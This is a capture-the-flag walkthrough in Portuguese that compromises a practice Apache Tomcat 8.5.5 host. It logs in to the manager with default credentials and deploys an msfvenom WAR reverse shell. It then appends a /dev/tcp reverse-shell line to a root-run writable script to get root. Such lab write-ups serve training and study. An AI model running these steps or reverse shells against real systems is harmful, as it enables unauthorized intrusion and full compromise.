#ctfs

# Reconhecimento inicial

Primeiro, realizamos o scan completo de portas no IP fornecido.

```shell
└─$ nmap -Pn --open -p- 10.67.165.222
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-28 21:27 -03
```

Como a execução não exibiu o resumo no terminal, o scan foi repetido com saída detalhada. As portas abertas identificadas foram `22` e `8080`.

```shell
└─$ nmap -Pn -n -vv --reason --open -p- 10.67.165.222
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-28 21:23 -03
Initiating SYN Stealth Scan at 21:23
Scanning 10.67.165.222 [65535 ports]
Discovered open port 22/tcp on 10.67.165.222
Discovered open port 8080/tcp on 10.67.165.222
```

Com as portas encontradas, identificamos as versões dos serviços.

```shell
└─$ nmap -Pn --open -p 22,8080 -sVC 10.67.165.222
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-28 21:24 -03
Nmap scan report for 10.67.165.222
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.70 seconds
```

# Enumeração

## Serviço Web

O serviço HTTP está disponível na porta `8080`, apresentando o Apache Tomcat 8.5.5. Fizemos a identificação das tecnologias e a verificação de WAF.

```shell
└─$ whatweb http://10.67.165.222:8080
http://10.67.165.222:8080 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.67.165.222], Title[Apache Tomcat/8.5.5]
```

```shell
└─$ wafw00f http://10.67.165.222:8080

                    ~ WAFW00F : v2.3.1 ~
    The Web Application Firewall Fingerprinting Toolkit

[*] Checking http://10.67.165.222:8080
[+] Generic Detection results:
[-] No WAF detected by the generic detection
[~] Number of requests: 7
```

Não foi necessário adicionar nenhum domínio ao arquivo `/etc/hosts`, pois o serviço respondeu diretamente pelo IP.

Em seguida, enumeramos diretórios e arquivos usando a wordlist definida no fluxo.

```shell
└─$ feroxbuster -u "http://10.67.165.222:8080" -w /usr/share/wordlists/dirb/big.txt -C 404,503,400 -x php,txt -o /tmp/thompson-ferox-completo.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.67.165.222:8080/
 🚩  In-Scope Url          │ 10.67.165.222
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt
 💢  Status Code Filters   │ [404, 503, 400]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ /tmp/thompson-ferox-completo.txt
 💲  Extensions            │ [php, txt]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l       47w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter

200      GET      177l      935w     7063c http://10.67.165.222:8080/docs/RELEASE-NOTES.txt
200      GET       34l      158w     1155c http://10.67.165.222:8080/docs/api/index.html
200      GET       18l      126w     9193c http://10.67.165.222:8080/tomcat.png
200      GET      351l      786w     5576c http://10.67.165.222:8080/tomcat.css
401      GET       63l      289w     2473c http://10.67.165.222:8080/manager/status
401      GET       63l      289w     2473c http://10.67.165.222:8080/manager/html
200      GET      168l     1111w    12881c http://10.67.165.222:8080/docs/setup.html
200      GET      351l     2076w    22689c http://10.67.165.222:8080/docs/deployer-howto.html
200      GET       22l       93w    42556c http://10.67.165.222:8080/favicon.ico
200      GET      676l     3577w    35168c http://10.67.165.222:8080/docs/jndi-datasource-examples-howto.html
200      GET      507l     3689w    34950c http://10.67.165.222:8080/docs/security-howto.html
200      GET     1094l     6026w    65347c http://10.67.165.222:8080/docs/changelog.html
200      GET      655l     4046w    43194c http://10.67.165.222:8080/docs/cluster-howto.html
200      GET     1223l     6948w    63146c http://10.67.165.222:8080/docs/realm-howto.html
200      GET     1405l     7670w    72734c http://10.67.165.222:8080/docs/manager-howto.html
302      GET        0l        0w        0c http://10.67.165.222:8080/docs/appdev => http://10.67.165.222:8080/docs/appdev/
302      GET        0l        0w        0c http://10.67.165.222:8080/examples => http://10.67.165.222:8080/examples/
200      GET       34l      158w     1155c http://10.67.165.222:8080/docs/api/
302      GET        0l        0w        0c http://10.67.165.222:8080/docs/config => http://10.67.165.222:8080/docs/config/
302      GET        0l        0w        0c http://10.67.165.222:8080/docs => http://10.67.165.222:8080/docs/
401      GET       54l      241w     2044c http://10.67.165.222:8080/host-manager/html
302      GET        0l        0w        0c http://10.67.165.222:8080/host-manager/ => http://10.67.165.222:8080/host-manager/html
302      GET        0l        0w        0c http://10.67.165.222:8080/manager/ => http://10.67.165.222:8080/manager/html
200      GET      202l      498w    11228c http://10.67.165.222:8080/
302      GET        0l        0w        0c http://10.67.165.222:8080/docs/api => http://10.67.165.222:8080/docs/api/
302      GET        0l        0w        0c http://10.67.165.222:8080/docs/architecture => http://10.67.165.222:8080/docs/architecture/
```

A enumeração revelou as interfaces administrativas do Tomcat (`/manager/html` e `/host-manager/html`), ambas protegidas por autenticação HTTP básica.

# Exploração

Ao tentarmos logar com um login genérico (ex 123:123), nos deparamos com a seguinte página de erro:

![Página de erro do Tomcat](Imagens/Pasted%20image%2020261028215621.png)

Tem uma credencial padrão nela, `tomcat:s3cret`. Ao tentarmos entrar no `/manager/html`testando essas credenciais conseguimos acesso.

![Acesso ao Tomcat Manager](Imagens/Pasted%20image%2020261028215721.png)

Basta implantar o arquivo `WAR`malicioso.

```shell
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=[MEU IP] LPORT=4444 -f war -o shell.war
Payload size: 1097 bytes
Final size of war file: 1097 bytes
Saved as: shell.war
```

E agora injetamos na aplicação

```shell
└─$ nc -lvnp 4444  
listening on [any] 4444 ...
connect to [Meu IP] from (UNKNOWN) [10.67.165.222] 34214
id    
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

Vamos procurar nossa flag de usuário já que estamos com usuário `tomcat`

```shell
cd /home
ls -la
total 12
drwxr-xr-x  3 root root 4096 Aug 14  2019 .
drwxr-xr-x 22 root root 4096 Aug 14  2019 ..
drwxr-xr-x  4 jack jack 4096 Aug 23  2019 jack
cd jack
ls -la
total 48
drwxr-xr-x 4 jack jack 4096 Aug 23  2019 .
drwxr-xr-x 3 root root 4096 Aug 14  2019 ..
-rw------- 1 root root 1476 Aug 14  2019 .bash_history
-rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout
-rw-r--r-- 1 jack jack 3771 Aug 14  2019 .bashrc
drwx------ 2 jack jack 4096 Aug 14  2019 .cache
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano
-rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile
-rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root root   39 Oct 28 18:00 test.txt
-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
-rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts
```

Basta coletarmos agora a flag de user em `/user/jack` 

```shell
cat user.txt
[flag user.txt]
```

# Pós-exploração

Agora precisamos escalar privilégios para root.

Observe algo interessante, temos um arquivo chamado `id.sh`, vamos ler o conteúdo dele

```shell
cat id.sh
#!/bin/bash
id > test.txt
```

Agora leiamos `test.txt`

```shell
cat test.txt
uid=0(root) gid=0(root) groups=0(root)
```

Olha o que está acontecendo, o arquivo `id.sh` está sendo executado como root, podemos abrir um novo listener em nossa máquina e gravar uma shellreversa no arquivo id.sh de forma que, ao executá-lo, ele nos devolva conexão privilegiada.

```shell
echo "sh -i >& /dev/tcp/[MEU IP]/4445 0>&1" >> id.sh
cat id.sh
#!/bin/bash
id > test.txt
sh -i >& /dev/tcp/[MEU IP]/4445 0>&1
```

O que nos retornou

```shell
└─$ nc -lvnp 4445                      
listening on [any] 4445 ...
connect to [Meu IP] from (UNKNOWN) [10.67.165.222] 46090
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

Basta agora somente lermos a flag de root

```shell
# cat /root/root.txt
[flag root.txt]
```

Com isso, encerra-se nosso CTF.
